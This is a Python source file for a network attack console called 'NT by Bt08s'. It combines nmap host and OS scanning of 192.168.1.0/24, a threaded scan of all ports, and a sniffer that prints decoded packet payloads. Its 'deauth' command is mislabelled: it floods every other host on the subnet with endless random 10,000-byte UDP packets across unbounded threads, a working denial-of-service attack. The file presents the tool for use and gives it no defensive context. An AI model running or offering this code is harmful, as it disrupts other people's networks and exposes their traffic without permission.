from scapy.all import sniff, IP, TCP, UDP, ICMP
import threading
import socket
import random
import nmap
import sys
import os

banner = """
 /$$   /$$             /$$                                       /$$             /$$$$$$$$                  /$$
| $$$ | $$            | $$                                      | $$            |__  $$__/                 | $$
| $$$$| $$  /$$$$$$  /$$$$$$   /$$  /$$  /$$  /$$$$$$   /$$$$$$ | $$   /$$         | $$  /$$$$$$   /$$$$$$ | $$
| $$ $$ $$ /$$__  $$|_  $$_/  | $$ | $$ | $$ /$$__  $$ /$$__  $$| $$  /$$/         | $$ /$$__  $$ /$$__  $$| $$
| $$  $$$$| $$$$$$$$  | $$    | $$ | $$ | $$| $$  \ $$| $$  \__/| $$$$$$/          | $$| $$  \ $$| $$  \ $$| $$
| $$\  $$$| $$_____/  | $$ /$$| $$ | $$ | $$| $$  | $$| $$      | $$_  $$          | $$| $$  | $$| $$  | $$| $$
| $$ \  $$|  $$$$$$$  |  $$$$/|  $$$$$/$$$$/|  $$$$$$/| $$      | $$ \  $$         | $$|  $$$$$$/|  $$$$$$/| $$
|__/  \__/ \_______/   \___/   \_____/\___/  \______/ |__/      |__/  \__/         |__/ \______/  \______/ |__/
\033[0m"""
banner = banner.replace('$', '\033[92m$\033[0m')

help_menu = """
 ┌──────────────────┬──────────────────────────────────┐
 │ 🔧 Command       │ 📝 Description                   │
 ├──────────────────┼──────────────────────────────────┤
 │ help             │ ❓ Help menu                     │
 │ exit             │ 🚪 Exit tool                     │
 │ update           │ 🔄 Update tool                   │
 │ clear            │ 🧹 Clear console                 │
 │ host scan        │ 🔍 IP - MAC - INFO               │
 │ port scan        │ 🔍 1-65535 open port scan        │
 │ deauth           │ 🚫 Disconnect hosts from net     │
 │ sniff packets    │ 👃 Sniff network packets         │
 └──────────────────┴──────────────────────────────────┘
"""


def set_title(title):
    if os.name == 'nt':
        import ctypes
        ctypes.windll.kernel32.SetConsoleTitleW(title)
    else:
        import sys
        sys.stdout.write(f"\033]0;{title}\007")
        sys.stdout.flush()


def clear():
    os.system('cls' if os.name == 'nt' else 'clear')


def host_scan(speed):
    try:
        nm = nmap.PortScanner()
        if speed == "slow":
            arguments = '-p 22,3389 -O -T4'
        elif speed == "fast":
            arguments = '-p 22,3389 -O -T5'
        else:
            arguments = '-p 22,3389 -O -T4'

        nm.scan(hosts='192.168.1.0/24', arguments=arguments)

        header = " ┌─────────────────┬───────────────────┬──────────────────────\n" \
                 " │       IP        │       MAC         │         Info         \n" \
                 " ├─────────────────┼───────────────────┼──────────────────────"

        footer = " └─────────────────┴───────────────────┴──────────────────────"
        print(header)

        for host in nm.all_hosts():
            mac_address = nm[host]['addresses'].get('mac')
            vendor = nm[host]['vendor'].get(mac_address)

            if 'osclass' in nm[host]:
                for osclass in nm[host]['osclass']:
                    print(f" │ {host:<15} │ {mac_address or 'N/A':<17} │ {vendor or 'N/A' and osclass['osfamily'] or '' and osclass['osgen'] or '':<41}")
            else:
                print(f" │ {host:<15} │ {mac_address or 'N/A':<17} │ {vendor or 'N/A':<41}")

        print(footer)
    except Exception as e:
        print(e)


def deauth(host):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        try:
            payload = random.randbytes(10000)
            client_socket.sendto(payload, (host, 65535))
            print(f"\033[32m[+]\033[0m Sent {len(payload)} bytes to {host}")
        except:
            print(f"\033[31m[-]\033[0m {host}")


def scan_port(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)

    try:
        sock.connect((ip, port))
        print(f"\033[32m[+]\033[0m {ip}:{port}")
    except socket.error:
        pass
    finally:
        sock.close()


def scan_all_ports(ip):
    for port in range(1, 65535):
        thread = threading.Thread(target=scan_port, args=(ip, port))
        thread.start()


def get_hostname(ip):
    try:
        hostname, _, _ = socket.gethostbyaddr(ip)
        return f" {hostname} "
    except socket.herror:
        return f" "


def decode_packet_data(data):
    try:
        return data.decode('utf-8', 'ignore')
    except UnicodeDecodeError:
        try:
            return data.decode('ISO-8859-1', 'ignore')
        except UnicodeDecodeError:
            return repr(data)


def packet_callback(packet):
    if IP in packet and (TCP in packet or UDP in packet):
        ip_src = packet[IP].src
        ip_dst = packet[IP].dst

        if TCP in packet:
            sport = packet[TCP].sport
            dport = packet[TCP].dport
            protocol = "TCP"
        elif UDP in packet:
            sport = packet[UDP].sport
            dport = packet[UDP].dport
            protocol = "UDP"

        host_src = get_hostname(ip_src)
        host_dst = get_hostname(ip_dst)

        if hasattr(packet.payload, 'load'):
            data = decode_packet_data(packet.payload.load)
            print(f"\033[93m[{protocol}]\033[0m{host_src}\033[94m{ip_src}:{sport}\033[0m \033[93m->\033[0m{host_dst}\033[94m{ip_dst}:{dport}\033[0m | {data}")
        else:
            # No data
            print(f"\033[93m[{protocol}]\033[0m{host_src}\033[94m{ip_src}:{sport}\033[0m \033[93m->\033[0m{host_dst}\033[94m{ip_dst}:{dport}\033[0m")


if __name__ == '__main__':
    clear()
    set_title("NT by Bt08s")
    print(banner)

    while True:
        cmd = input("nt> ")
        cmd = cmd.lower()

        if cmd in ["help", "?"]:
            print(help_menu)
        elif cmd == "exit":
            sys.exit()
        elif cmd == "update":
            print("Soon.")
        elif cmd == "clear":
            clear()

        elif cmd.startswith("host scan"):
            if cmd.endswith("-slow") or cmd.endswith("-s"):
                host_scan("slow")
            elif cmd.endswith("-fast") or cmd.endswith("-f"):
                host_scan("fast")
            else:
                print("Usage: host scan -slow(more_info)/-fast(less_info)")

        elif cmd == "port scan":
            nm = nmap.PortScanner()
            nm.scan(hosts='192.168.1.1/24', arguments='-sn')

            threads = []
            for host in nm.all_hosts():
                thread = threading.Thread(target=scan_all_ports, args=(host,))
                thread.daemon = True
                threads.append(thread)
                thread.start()

            for thread in threads:
                thread.join()

        elif cmd == "deauth":
            own_host_ip = socket.gethostbyname(socket.gethostname())

            nm = nmap.PortScanner()
            nm.scan(hosts='192.168.1.0/24', arguments='-sn')

            while True:
                for host in nm.all_hosts():
                    if host != own_host_ip:
                        thread = threading.Thread(target=deauth, args=(host,))
                        thread.start()

        elif cmd == "sniff packets":
            sniff(prn=packet_callback, store=0)

        elif len(cmd) > 0:
            print("Invalid command. Type ? for help.")
